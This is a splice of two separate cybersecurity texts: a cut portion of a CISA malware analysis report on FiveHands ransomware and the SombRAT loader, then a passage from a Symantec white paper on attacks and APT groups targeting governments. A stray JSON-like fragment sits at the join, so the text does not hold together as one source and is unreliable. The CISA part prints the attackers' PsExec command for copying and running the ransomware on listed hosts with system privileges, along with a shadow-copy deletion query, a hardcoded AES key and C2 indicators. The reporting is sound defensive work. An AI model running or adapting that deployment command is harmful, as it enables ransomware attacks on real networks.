Remote Desktop Protocol (RDP) ports for several subnets of unrouteable\nInternet Protocol (IP) addresses.\n\nnetscan.lic\n\nA license is required to unlock all of the features of the SoftPerfect Network Scanner. The\nnetscan.lic  artifact is the Network Scanner license that was included with this\n\nsubmission. The license name is DeltaFoX .\n\nFiveHands Ransomware\n\nThe malicious cyber actor used PsExec to execute ServeManager.exe , which CISA refers\nto as FiveHands ransomware (Execution [TA0002], System Services: Service Execution\n[T1569.002], Impact [TA0040]). FiveHands is a novel ransomware variant that uses a public\nkey encryption scheme called NTRUEncrypt . Note: the NTRUEncrypt public key\ncryptosystem encryption algorithm (NTRU), is a lattice-based alternative to Rivest-Shamir-\nAdleman, known as RSA, and Elliptic-curve cryptography, or ECC, and is based on the\nshortest vector problem in a lattice.\n\nTo prevent data recovery, FiveHands uses WMI to first enumerate then delete Volume\nShadow copies (Inhibit System Recovery [T1490]; Windows Management Instrumentation\n[T1047]). The malware also encrypts files in the recovery folder (Data Encrypted for Impact\n[T1486]). After the files are encrypted, the program will write a ransom note to each folder\nand directory on the system.\n\nhttps://attack.mitre.org/versions/v9/software/S0029/\nhttps://attack.mitre.org/versions/v9/tactics/TA0002/\nhttps://attack.mitre.org/versions/v9/techniques/T1569/002/\nhttps://attack.mitre.org/versions/v9/tactics/TA0040/\nhttps://attack.mitre.org/versions/v9/techniques/T1490/\nhttps://attack.mitre.org/versions/v9/techniques/T1047/\nhttps://attack.mitre.org/versions/v9/techniques/T1486/\n\n\n3/10\n\nDetails on the ransomware artifacts are below.\n\nPsExec.exe\n\nThe PsExec.exe  artifact is the legitimate remote administration program. This tool is part of\nMicrosoft's Sysinternals tool suite. This utility was used to execute the program\nServeManager.exe  with the following arguments:\n\npsexec.exe -d @comps.txt -s -relatime -c ServeManager.exe -key  \n\nThe arguments are defined as follows:\n\n          -d  --> Run psexec.exe without any prompts.\n\n          @  --> Remotely access this list of hostnames/IP addresses.\n\n          -s  --> Run the program with system level privileges.\n\n          -relatime  --> This is a typo. This should be -realtime, or run this process before any\nother process.\n\n          -c  --> Copy the program to the remote system before executing.\n\nServeManager.exe\n\nThe ServeManager.exe  artifact is a 32-bit executable file that is executed using the\nMicrosoft Sysinternals remote administration tool, PsExec.exe . When the program is\nexecuted it will attempt to load into memory a large embedded module that is decoded with a\nsupplied key. The module is decoded in memory and checked to verify that it has a portable\nexecutable (PE) header. If the header is verified, the payload is executed.\n\nThe payload is a 32-bit executable file that is used to encrypt files on the victim’s system to\nextort a ransom. When the ransomware is executed, it will enumerate files and folders on the\nsystem and encrypt files with the extensions, .txt , .chm , .dat , .ocx , .js , .tlb ,\n.vbs , .sys , .lnk , .xml , .jpg , .log , .zip , .htm , .ini , .gif , .html ,\n.css , and others (File and Directory Discovery [T1083]). Key system files are not\n\nencrypted.\n\nTo thwart the recovery of the data, the ransomware uses Windows Management\nInstrumentation (WMI) to enumerate Volume Shadow copies using the command select *\nfrom Win32_ShadowCopy  and then deletes copies by ID ( Win32_ShadowCopy.ID ). The\nmalware will also encrypt files in the recovery folder at C:\\Recovery . After the files are\nencrypted the program will write a ransom note to each folder and directory on the system\ncalled read_me_unlock.txt .\n\nFigure 1 displays the ransom note (redacted for privacy).\n\nhttps://attack.mitre.org/versions/v9/techniques/T1083/\n\n\n4/10\n\nFigure 1: Ransom note\n\n \nRemote Access Trojan: SombRAT \n\nThe threat actors used batch and text files to execute and invoke PowerShell scripts that\ndecoded a SombRAT loader and enabled PowerShell to bypass the organization’s anti-\nmalware program (Command and Scripting Interpreter: Windows Command Shell\n[T1059.003], Command and Scripting Interpreter: PowerShell [T1059.001], Defense Evasion\n[TA0005]). SombRAT is a custom remote access Trojan (RAT) used to download and\nexecute malicious payloads.[1] \n\nThe SombRAT loader recovered in this incident was a 64-bit variant that allowed the\nmalicious actor to remotely download and load executable dynamic-link libraries (DLL)\nplugins on the affected system (Ingress Tool Transfer [T1105]). The loader used hardcoded\npublic RSA keys for command and control (C2) sessions (Command and Control [TA0011]).\nThe C2 communications were encrypted using Advanced Encryption Standard (AES),\nresulting in a Secure Sockets Layer tunnel with the threat actors (Encrypted Channel:\nAsymmetric Cryptography [T1573.002]).\n\nDetails on the SombRAT artifacts are below.\n\nWwanSvc.bat\n\nThe WwanSvc.bat  artifact is a batch file. When executed, it will invoke PowerShell, which\ndecodes and executes a base64-encoded PowerShell script called WwanSvc.txt  in the\npath C:\\ProgramData\\Microsoft\\WwanSvc\\  (Deobfuscate/Decode Files or Information\n[T1140], Obfuscated Files or Information [T1027]).\n\nWwanSvc.txt\n\nhttps://attack.mitre.org/versions/v9/techniques/T1059/003/\nhttps://attack.mitre.org/versions/v9/techniques/T1059/001/\nhttps://attack.mitre.org/versions/v9/tactics/TA0005/\nhttps://blogs.blackberry.com/en/2020/11/the-costaricto-campaign-cyber-espionage-outsourced\nhttps://attack.mitre.org/versions/v9/techniques/T1105/\nhttps://attack.mitre.org/versions/v9/tactics/TA0011/\nhttps://attack.mitre.org/versions/v9/techniques/T1573/002/\nhttps://attack.mitre.org/versions/v9/techniques/T1140/\nhttps://attack.mitre.org/versions/v9/techniques/T1027/\n\n\n5/10\n\nThe WwanSvc.txt  artifact is a base64-encoded PowerShell script that is decoded and\nexecuted by WwanSvc.bat . The script allows PowerShell to run without system restrictions\nwhile bypassing the Microsoft anti-malware program. Next, the script decodes the file\nWwanSvc.c  using a bitwise Exclusive OR (XOR) with a 256-byte key that is found in\nWwanSvc.a . Both WwanSvc.a  and WwanSvc.c  are located in\nC:\\ProgramData\\Microsoft\\ . The newly decoded script is then executed using the\nInvokeExpression  command.\n\nWwanSvc.a\n\nThe WwanSvc.a  artifact contains a 256-byte key that is used by the base64-encoded script\nin WwanSvc.txt  to decode a new PowerShell script in WwanSvc.c . The key is also used\nto decode the reflectively loaded payload in WwanSvc.b .\n\nWwanSvc.c\n\nThe WwanSvc.c  artifact is an XOR-encoded PowerSploit reflective loader program.[2] The\nprogram is decoded using the 256-byte key found in WwanSvc.a . The script will decode the\ncontent of WwanSvc.b  and then check to confirm that it has a valid PE header. The script\nwill also check the system environment for a 64-bit architecture (System Information\nDiscovery [T1082]). The executable is not written to disk but loaded directly into memory.\n\nWwanSvc.b\n\nThe WwanSvc.b  artifact, when decoded, is a 64-bit variant of the SombRAT loader. The\nprimary purpose of the loader is to allow a remote operator to securely download and load\nexecutable plugins on a target system. Given this plugin structure, the author can easily mold\nthe RAT to provide additional functionalities and capabilities. The application contains the\nfollowing two hardcoded public RSA keys, which it will utilize to secure its C2 sessions with\nthe remote operator. Static analysis indicates that the C2 communications will also be\nencrypted using AES resulting in a secure Secure Sockets Layer (SSL) tunnel with the\nremote operator.\n\nThe configuration file 59fb3174bb34e803 , located in C:\\ProgramData , contains the data\nthe malware requires at runtime, including the operator-controlled remote C2 address. The\nmalware decrypts this configuration file with the hardcoded AES key\nujnchdyfngtreaycnbjgi837157fncae . See figure 2.\n\n  \n\nhttps://attack.mitre.org/software/S0194/\nhttps://attack.mitre.org/versions/v9/techniques/T1082/\n\n\n6/10\n\nFigure 2: Hardcoded AES key\n\nThe malware contains numerous encoded strings, including the AES key used to decrypt the\nmalware configuration file. The malware decrypts these strings by first XORing them with the\nfirst byte. The malware then decrypts the rest of the string by XORing it with the single byte\nXOR key 0xDE . \n\nThis string can be decrypted by XORing the entire string with the value 0x78  and then\nXORing the result with 0xDE .\n\nThe RAT provides most of its C2 capabilities to the remote operator by allowing the remote\noperator to securely transfer executable DLL plugins to the target system—via a protected\nSSL session—and load these plugins at will via the embedded plugin framework. The native\nmalware itself does not provide much actual functionality to the operator without the code\nprovided by the plugins. Some of the native functionality that the malware provides without\nthe use of a plugin includes collecting system data—such as computer name, username,\ncurrent process, operating system (OS) version, local system time, and the current process\nthat the malware is masquerading as (System Owner/User Discovery [T1033], Process\nDiscovery [T1057], System Time Discovery [T1124], Masquerading [T1036]). The program\nalso contains native C2 capabilities allowing it to communicate with the remote operator\nusing an embedded SOCKS proxy or via domain name system (DNS) tunneling (Proxy\n[T1090]).\n\nThe malware does contain hardcoded commands that it uses to evaluate against operator-\nprovided data. These commands are encoded within the binary, and they are not encoded\nbefore being compared against operator-provided data—indicating the malware expects the\n\nhttps://attack.mitre.org/versions/v9/techniques/T1033\nhttps://attack.mitre.org/versions/v9/techniques/T1057\nhttps://attack.mitre.org/versions/v9/techniques/T1124\nhttps://attack.mitre.org/versions/v9/techniques/T1036\nhttps://attack.mitre.org/versions/v9/techniques/T1090\n\n\n7/10\n\nremote operator to encode the commands before passing them to the RAT. \n\nThe malware contains an encoded note, presumably designed for malware analysts who\nanalyze the code. See figure 3.\n\nFigure 3: Encoded note\n\n \n59fb3174bb34e803\n\nThe 59fb3174bb34e803  artifact is an encrypted configuration file that is read by the\nWwanSvc program. The configuration file contains the hardcoded domain,\nfeticost[.]com . The program attempts DNS queries for this domain prepending a third\n\nlevel domain that consists of seven to nine random hexadecimal characters (e.g.,\nbb95058f1[.]feticost.com ).\n\nThe file feticost[.]com  resolved to the IP address 51.89.50[.]152  at the time of\nanalysis.\n\nPublicly Available Tool: RouterScan.exe\n\n\n\n8/10\n\nThe RouterScan.exe  artifact is Router Scan v2.60 by Stas'M. This utility is used to identify\nnetwork routers and proxy servers on a network (Discovery [TA0007]). The latest release of\nthis program (v2.60) contains a list of common admin names and passwords that can be\nused for a dictionary attack to gain access to a network router (Credential Access [TA0006],\nBrute Force: Password Guessing [T1110.001]). The program also contains code to identify\ncommon vulnerabilities and leverage exploits against many popular routers (Active\nScanning: Vulnerability Scanning [T1595.002]). The program can be customized to scan any\nsubnet and any particular port, or protocol (Network Service Scanning [T1046]). The latest\nversion also contains software to scan for wireless network access points (System Network\nConnections Discovery [T1049]). \n\nTo execute this program, two libraries are required: librouter.dll  and libeay32.dll .\nUpon execution, the program will generate several telemetry files that are dropped in the\ncurrent directory. These files are named RouterScan.log , Config.ini , filter.txt ,\nexclusions.txt , ports.txt , and ranges.txt .\n\nOpen-Source Tool: grabff.exe\n\nThe grabff.exe  artifact is a 32-bit .NET executable called grabff and is used for Credential\nAccess [TA0006]. The program uses a command line interface to extract Firefox stored\npasswords and authentication information from the user’s profile located at C:\\Users\\\n<user>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles  (Command and Scripting\nInterpreter: Windows Command Shell [T1059.003], Credentials from Password Stores:\nCredentials from Web Browsers [T1555.003]). The program will extract the password\ndatabases found in key3.db , key4.db , and logins.json  as well as the SQLite-based\ncertificate database, cert9.db . The data can be copied to any designated directory.\n\nOpen-Source Tool: rclone.exe\n\nThe rclone.exe  artifact is an open-source cloud content management program called\nRclone. The program uses a command line interface to manage files in cloud storage. The\nprogram is capable of uploading and downloading files, verifying file integrity, and providing\nfile encryption. The program can use any of the following protocols: SSH File Transfer\nProtocol (SFTP), Web Distributed Authoring and Versioning (WebDAV), File Transfer\nProtocol (FTP), and Digital Living Network Alliance (DLNA).\n\ns3browser-9-5-3.exe\n\nThe s3browser-9-5-3.exe  artifact is the free version of the S3 Browser program used to\nupload and download data from a cloud account. The program can fully configure a cloud\naccount, modify HTTP headers and object tags, enable multiple simultaneous uploads and\ndownloads, and provide server-side encryption (Create Account: Cloud Account\n[T1136.003]). By default, the installed components of the program are stored in the path\n\nhttps://attack.mitre.org/versions/v9/tactics/TA0007/\nhttps://attack.mitre.org/versions/v9/tactics/TA0006/\nhttps://attack.mitre.org/versions/v9/techniques/T1110/001/\nhttps://attack.mitre.org/versions/v9/techniques/T1595/002/\nhttps://attack.mitre.org/versions/v9/techniques/T1046/\nhttps://attack.mitre.org/versions/v9/techniques/T1049/\nhttps://attack.mitre.org/versions/v9/tactics/TA0006/\nhttps://attack.mitre.org/versions/v9/techniques/T1059/003/\nhttps://attack.mitre.org/versions/v9/techniques/T1555/003/\nhttps://attack.mitre.org/versions/v9/techniques/T1136/003/\n\n\n9/10\n\nC:\\Program Files\\S3 Browser .

The guide\ncontains steps for detection and analysis as well as containment and eradication.\n\nCISA recommends organizations implement the following practices to strengthen the security\nposture of their systems. \n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up to date.\nDisable file and printer sharing services. If these services are required, use strong\npasswords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications.\nDo not add users to the local administrators group unless required.\nImplement multi-factor authentication (MFA), particularly on all VPN connections,\nexternal-facing services, and privileged accounts. Where MFA is not implemented,\nenforce a strong password policy and implement regular password changes.\nDecommission unused VPN servers, which may act as a point of entry for attackers. \nMonitor network traffic for unexpected and unapproved protocols, especially outbound\nto the internet (e.g., SSH, SMB, RDP).\nExercise caution when opening email attachments even if the attachment is expected\nand the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited\nconnection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for—and remove—suspicious e-mail attachments; ensure the scanned\nattachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external\ndrives, CDs).\nScan all software downloaded from the internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate access\ncontrol lists (ACLs).\n\nReferences\n\n[1] BlackBerry ThreatVector Blog, The CostaRicto Campaign: Cyber-Espionage Outs…\n[2] MITRE ATT&CK – PowerSploit\n\nhttps://www.cisa.gov/publication/ransomware-guide\nhttps://blogs.blackberry.com/en/2020/11/the-costaricto-campaign-cyber-espionage-outsourced\nhttps://attack.mitre.org/software/S0194/\n\n\n10/10\n\nRevisions\n\nMay 6, 2021: Initial Version\n\nThis product is provided subject to this Notification and this Privacy & Use policy.\n\nPlease share your thoughts.\n\nWe recently updated our anonymous product survey; we'd welcome your feedback.\n\nhttps://us-cert.cisa.gov/privacy/notification\nhttps://www.dhs.gov/privacy-policy\nhttps://www.surveymonkey.com/r/CISA-cyber-survey?product=https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a",

Attacks from organized criminals, foreign countries, political \nhacktivists, and others not only erode public trust in targeted government \nentities, but can also seriously impact government operations and the \nability to deliver critical functions—not to mention the financial cost and \nrisk to sensitive information and vital infrastructure. This all means that \ncyber security is a large and growing concern for governments worldwide.\n\nIncreasingly, federal, state, and local governments are targets as threat \nactors attempt to steal or manipulate sensitive data or disrupt operations. \nThis was highlighted in December 2020 when news emerged of the \nSolarWinds supply chain attack in which multiple parts of the U.S. Federal \nGovernment, NATO, the UK government, and the European Parliament were \nimpacted. The incident, which also impacted thousands of organizations in \nthe private sector, was reported to be among the worst cyber-espionage \nincidents ever suffered by the U.S.\n\nhttps://symantec-enterprise-blogs.security.com/blogs/solarwinds\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nDifferent types of groups or individuals can initiate attacks against the government sector, and their motivations \nvary widely. Foreign nations may seek to obtain sensitive information about government operations; criminals \nmay steal government employee data to hold for ransom or to sell and commit fraud; and hacktivists motivated \nby ideology rather than profit may seek to disrupt or gather information to further their agenda. In addition, types \nof attack can also vary widely, ranging from ransomware, to email-based social engineering attacks, to zero-day \nexploits, and supply chain attacks.\n\nWhat is the Government Sector?\n\nAs the government sector is vast and incorporates a wide range of entities, for this paper we chose to use \nthe Public Administration sector as defined by the North American Industry Classification System (NAICS). \nSector 92: Public Administration is defined as consisting of establishments of federal, state, and local government \nagencies that administer, oversee, and manage public programs and have executive, legislative, or judicial authority \nover other institutions within a given area. \n\nSome of the key areas covered in this paper include the following:\n\n•\t Examples of Attacks: Some recent examples of attacks against government entities broken up into common \nattack types/motivations.\n\n•\t Who is Attacking? A look at some prominent advanced persistent threat (APT) groups with a focus on \ntargeting the government sector.\n\n•\t Malicious Activity Trends: Key trends taken from Symantec, a division of Broadcom (NASDAQ: AVGO), \nmetrics.\n\n•\t Case Studies: A detailed look at two cases worked on by the Symantec Threat Hunter Team.\n\n•\t How to Protect Your Network: Protection and mitigation information that can be used by organizations in the \ngovernment sector to protect their networks.\n\nExamples of Attacks\nWhile cyber attacks against the government sector are far too numerous to list, in recent times there have been \na number of notable incidents that highlight the range of attacks this sector is subject to, as well as the various \ntactics employed. \n\nRansomware\n\nArgentinian Border Crossing Shut Down\n\nIn August 2020, Argentina’s immigration agency (Dirección Nacional de Migraciones) suffered a ransomware attack \nthat forced it to close the country’s border crossing. The Netwalker ransomware (Ransom.Netwalker), also known \nas Mailto, infected a number of servers at the immigration agency, which led to it deciding to completely shut down \nnetworks used by immigration offices and control posts. This meant that border crossings were suspended for \nseveral hours. The malware operators initially demanded a $2 million ransom, however, this increased to $4 million \nafter the Argentinian government refused to negotiate with the criminals.\n\nIreland’s National Health Service\n\nOn May 14, 2021, Ireland’s national health service, the Health Service Executive (HSE), was hit with a ransomware \nattack that led to it having to shut down its IT systems. The attack impacted all its national and local services.\n\nThe attack was committed by a suspected Russian cyber crime group using the Conti ransomware (Ransom.Conti). \nThe threat actors claimed they had access to the HSE network for two weeks, stole 700 GB of unencrypted files, \nand demanded a $20 million ransom. The Irish government said it would not be paying any ransom. Shortly after \nthis announcement, the Conti attackers provided a free decryptor but warned they would still publish stolen patient \ndata online unless a ransom was paid.\n\nhttps://www.naics.com/six-digit-naics/?code=92\nhttps://www.bleepingcomputer.com/news/security/netwalker-ransomware-hits-argentinian-government-demands-4-million/\nhttps://www.ncsc.gov.ie/pdfs/HSE_Conti_140521_UPDATE.pdf\nhttps://www.ncsc.gov.ie/pdfs/HSE_Conti_140521_UPDATE.pdf\nhttps://www.bleepingcomputer.com/news/security/conti-ransomware-gives-hse-ireland-free-decryptor-still-selling-data/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nIreland’s Department of Health (the parent department of the HSE) was also targeted by the Conti gang. The \ndepartment shut down its systems following the incident but Ireland’s Minister for Communications said that the \nattack “wasn’t as extensive” as the HSE attack and was intercepted earlier.\n\nEspionage\n\nSolarWinds Supply Chain Attack\n\nIn mid-December 2020, news broke of the SolarWinds supply chain attack. In this particular case, rather than \nattacking the targets directly, the hackers compromised a third-party software provider (SolarWinds), accessing its \nbuild system and sneaking malicious code into updates to popular software Orion. \n\nBy compromising the update mechanism for SolarWinds’ Orion software, the attackers were able to deliver a \nbackdoor Trojan known as Sunburst (Backdoor.Sunburst). While thousands of organizations downloaded the \nTrojanized software update, the attackers were only interested in a relatively small selection. The nature of supply \nchain attacks mean they are indiscriminate, with any user of the compromised software at risk of infection. The \nattackers then get to pick and choose from the infected organizations, focusing on high-value targets for, in this \ncase, the purpose of espionage. \n\nA number of key U.S. federal agencies downloaded the malicious update, including the Department of Commerce, \nthe Department of Homeland Security, the Treasury Department, and the Justice Department. The Justice \nDepartment later revealed that around 3% of its Office 365 mailboxes had been accessed by the attackers behind \nthe attack. NATO, the UK government, and the European Parliament were also impacted by the SolarWinds attack.\n\nIn April 2021, three months after news first broke of the attack, the U.S. government said that SVR, the Russian \nForeign Intelligence Service (aka Fritillary, APT 29, Cozy Bear) was responsible for the SolarWinds attack. The U.S. \nimposed wide-ranging sanctions against Russia as a response.\n\nSymantec carried out extensive research into the SolarWinds attack, including detailed analysis of additional \nmalware (Teardrop and Raindrop) used by the attackers and insights into the command and control process used. \nAll this research, along with protection information, can be found on our dedicated blog page. \n\nDragonfly Exploiting Known Vulnerabilities\n\nIn October 2020, the Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of \nInvestigation (FBI) released a joint statement revealing attacks carried out by a Russian state-sponsored hacking \ngroup against U.S. government networks. The hacking group was Dragonfly (aka Energetic Bear, Berserk Bear, \nCrouching Yeti, Koala).\n\nThe attackers had been targeting dozens of state and local government networks since at least February 2020. The \ngroup successfully compromised network infrastructure and exfiltrated data from at least two victim servers by \ncombining exploits for known VPN appliances and Windows vulnerabilities. The hackers used the vulnerabilities to \nbreach networking gear, pivot to internal networks, elevate privileges, and steal sensitive data.\n\nTargeted devices included Citrix access gateways (CVE-2019-19781), Microsoft Exchange email servers \n(CVE-2020-0688), Exim mail agents (CVE 2019-10149), and Fortinet SSL VPNs (CVE-2018-13379). To move laterally \nacross compromised networks, the attackers used the Zerologon elevation-of-privilege vulnerability in Windows \nServers (CVE-2020-1472) to access and steal Windows Active Directory (AD) credentials.\n\nDenial of Service\n\nBelgian Government Knocked Offline by DDoS Attack\n\nIn May 2021, Belgium’s government was hit with a major distributed denial of service (DDoS) attack that knocked \nmost of its network offline, including public-facing websites and internal systems. The attack targeted Belnet, a \nstate-owned ISP that provides connectivity and infrastructure for the country’s government and public sector \norganizations. At least 200 public organizations were affected by the attack, including the country’s tax portal, \nremote learning systems used by schools, and its COVID vaccine registration portal. \n\nhttps://www.rte.ie/news/ireland/2021/0516/1221933-dept-of-health/\nhttps://www.justice.gov/opa/pr/department-justice-statement-solarwinds-update\nhttps://www.justice.gov/opa/pr/department-justice-statement-solarwinds-update\nhttps://www.whitehouse.gov/briefing-room/statements-releases/2021/04/15/fact-sheet-imposing-costs-for-harmful-foreign-activities-by-the-russian-government/\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/sunburst-supply-chain-attack-solarwinds\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\nhttps://symantec-enterprise-blogs.security.com/blogs/solarwinds\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-296a\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/dragonfly-energy-sector-cyber-attacks\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-19781\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-0688\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10149\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-13379\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-1472\nhttps://therecord.media/belgiums-government-network-goes-down-after-massive-ddos-attack/\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nWhile the attack has yet to be attributed to anyone, several Belgian politicians and political observers suggested \nthat the incident may have been politically motivated. \n\nWho is Attacking?\nAs well as ransomware actors out for financial gain and hacktivists with a goal of making political statements, \nadvanced persistent threat (APT) groups are one of the biggest threats to the government sector. These highly \nskilled and typically state-sponsored threat actors are well resourced and use sophisticated hacking techniques to \ngain access to target networks. Because of the level of effort needed to carry out these attacks, APTs are usually \nleveled at high-value targets, such as those in the government sector. \n\nThe following selection of advanced persistent threat (APT) groups have been known to target the government \nsector. Each APT group is listed under the nation state it is believed to receive direction and support from.\n\nIran\n\nCrambus \n\nBelieved to have been active since at least 2014, Crambus (aka APT34, Oilrig, Twisted Kitten) is known to have \ntargeted government agencies, financial institutions, and technology companies in Saudi Arabia, Israel, the United \nArab Emirates (UAE), Lebanon, Kuwait, Qatar, the U.S., and Turkey.\n\nThe group delivers a custom backdoor known as Heherminth via spear-phishing attacks, targeting individuals \nwithin organizations of interest using malicious Office documents with embedded macros to install a backdoor. The \ngroup may also send emails containing links to websites registered by the attackers and employ social-engineering \ntactics to trick victims into downloading and installing the backdoor.\n\nThe goal of the group is cyber espionage, focusing on reconnaissance efforts to benefit Iranian nation-state \ninterests. \n\nChina\n\nCicada\n\nThe Chinese government-linked group known as Cicada (aka APT10, Stone Panda, Cloud Hopper) has been active \nsince at least 2009 and is believed to be involved in espionage-type operations. Cicada traditionally customizes \npublicly available malware in concert with dual-use tools during operations. The group leverages a number of \ntechniques during the initial stages of attack, such as targeted email, strategic website compromise, and supply \nchain attacks. \n\nCicada is known to target numerous sectors, including government, aerospace, energy, engineering, financial, \nhealthcare, IT, manufacturing, media, and research. The group is known to target the following regions: Australia, \nChina, Hong Kong, Japan, Taiwan, the UK, and the U.S. However, since 2016, Cicada appears to have mainly \nfocused on targeting organizations in Japan across numerous sectors, including government, media, research, and \ntransport. In November 2020, Symantec uncovered evidence that Cicada was behind a large-scale attack campaign \ntargeting multiple Japanese companies, including subsidiaries located in as many as 17 regions around the globe in \na likely intelligence-gathering operation.\n\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nCicada is known to use a combination of generally available malware and tools during operations, including the \nfollowing:\n\n•\t Backdoor.Darkmoon (Specific configurations)\n\n•\t Backdoor.ChChes (Exclusively used)\n\n•\t Backdoor.Korplug (Specific configurations)\n\n•\t Trojan.Redleavy (Exclusively used)\n\n•\t Trojan.Wimhop (A modified version of wmiexec.vbs available on GitHub)\n\n•\t Backdoor.Hartip\n\n•\t Tcping (Publically available tool to check connectivity)\n\n•\t Csvde (Microsoft tool for Active Directory)\n\n•\t PsExec (Microsoft tool for executing commands/files on a remote host)\n\n•\t Netsess (Publically available tool to enumerate NetBIOS sessions)\n\n•\t Trojan.Agentemis (aka Cobalt Strike)\n\nBudworm\n\nBudworm (aka APT27, Lucky Mouse, Emissary Panda) has been active since at least July 2013. \n\nThe Chinese government-linked group uses the malware families Backdoor.Korplug, Trojan.Browrat, and Hyperbro \nin its attacks. Budworm has been known to leverage strategic website compromises and spear-phishing attacks to \ntarget victims in the aerospace, defense, government, and technology industries.\n\nAccording to ESET, in early 2021 Budworm began exploiting several Microsoft Exchange Server zero-day \nvulnerabilities. The group targeted multiple government networks in the Middle East and wider organizations in \nCentral Asia for the purpose of cyber espionage. The group used the email server access, and the compromise \nof Microsoft SharePoint, to deploy a newly updated modular toolkit known as SysUpdate, which is designed to \nprovide on-demand malicious capabilities.\n\nRussia\n\nSwallowtail\n\nSwallowtail (aka APT28, Sofacy, Fancy Bear, Tsar Team, Sednit) is believed to be a Russian cyber espionage group \nthat has been active since at least January 2007. The group was initially known for traditional, information-stealing \nespionage campaigns, targeting governments in the U.S. and Europe. It became involved in more overt, disruptive \noperations in the run-up to the 2016 U.S. presidential election.\n\nThe group has been known to employ a variety of methods to gain access to targeted organizations’ networks. \nThese include spear-phishing emails, watering hole websites, infected storage devices, and exploitation of software \nvulnerabilities, including zero-day vulnerabilities.\n\nDuring the 2016 U.S. presidential election attacks, APT28 used spear-phishing emails that tricked recipients \ninto supposedly changing their email passwords on a fake webmail domain. The group then used these stolen \ncredentials to gain access to email accounts and steal the contents. This information was later leaked.\n\nSymantec has seen APT28 use a number of custom malware tools, including:\n\n•\t Infostealer.Sofacy\n\n•\t OSX.Sofacy\n\n•\t Trojan.Sofacy\n\n•\t Trojan.Modruner\n\nhttps://www.welivesecurity.com/wp-content/uploads/2021/04/ESET_Industry_Report_Government.pdf\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-exchange-server-protection\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/microsoft-exchange-server-protection\n\n\nAttacks Against the Government Sector\n\nWhite Paper\n\nIn December 2020, the Norwegian police secret service (PST) stated that it believed Swallowtail was likely \nresponsible for hacking the email accounts of the Norwegian Parliament (Stortinget). In the attack, which took \nplace in August 2020, the hackers gained access to the Parliament’s email system and accessed inboxes for \nStortinget employees and elected officials.\n\nFritillary\n\nFritillary (aka APT29, Cozy Bear, the Dukes) is believed to be a Russian cyber espionage group and has been active \nsince at least January 2010. Like APT28, it initially confined itself to spying campaigns, focusing on governments, \nthe military, and think tanks in the U.S. and Europe. It later became involved in more subversive operations and was \nimplicated (along with APT28) in disruptive attacks prior to the 2016 U.S. presidential election.\n\nAPT29 usually relies on spear-phishing emails to gain access to targeted organizations’ networks. During the \n2016 U.S. presidential election attacks, APT29 sent spear-phishing emails to more than 1,000 targeted individuals, \nincluding some U.S. government personnel. These emails contained malicious links which, if clicked, would lead to \nmalware being installed on the target’s computer. This allowed APT29 to compromise a political party’s systems \nand steal emails from several accounts on the network.\n\nSymantec has seen APT29 use a number of custom malware tools, including:\n\n•\t Trojan.Cozer\n\n•\t Trojan.Seaduke\n\n•\t Trojan.Dionisduke\n\n•\t Backdoor.Netduke\n\n•\t Trojan.Powerduke\n\n•\t Backdoor.Miniduke\n\nMore recently, the Federal Bureau of Investigation (FBI), the U.S. Department of Homeland Security (DHS), and \nthe Cybersecurity and Infrastructure Security Agency (CISA) warned of continued attacks coordinated by the \nRussian Foreign Intelligence Service (SVR) (aka Fritillary) against U.S. and foreign organizations. The agencies said \nthis activity, which included the SolarWinds Orion supply chain compromise (see Examples of Attacks), primarily \ntargets government networks, think tank and policy analysis organizations, and information technology companies \nand seeks to gather intelligence information. \n\nFor more information on the Swallowtail and Fritillary groups, read our blog Subverting Democracy: How Cyber \nAttackers Try to Hack the Vote.\n\nNorth Korea\n\nSpringtail\n\nSpringtail (aka Kimsuky, Thallium, Nickle Foxcroft) has been active since at least 2012. The group is believed to be \noperating on behalf of the North Korean government. \n\nSpringtail uses the malware families Trojan.Destfallen, Trojan.Kisuky, and Bloodhound.hwp.5 in its attacks. The group \nis known to use social engineering tactics, spear-phishing emails, and watering hole attacks to compromise its \nvictims in order to gain intelligence on various topics of interest to the North Korean government.\n\nSpringtail targets individuals and organizations in South Korea, Japan, and the U.S. Springtail specifically targets \nindividuals identified as experts in various fields, think tanks, and South Korean government entities. The group \nfocuses its intelligence collection activities on foreign policy and national security issues related to the Korean \npeninsula, nuclear policy, and sanctions.\n\nIn September 2020 it was reported that Springtail attempted to hack 11 officials of the United Nations Security 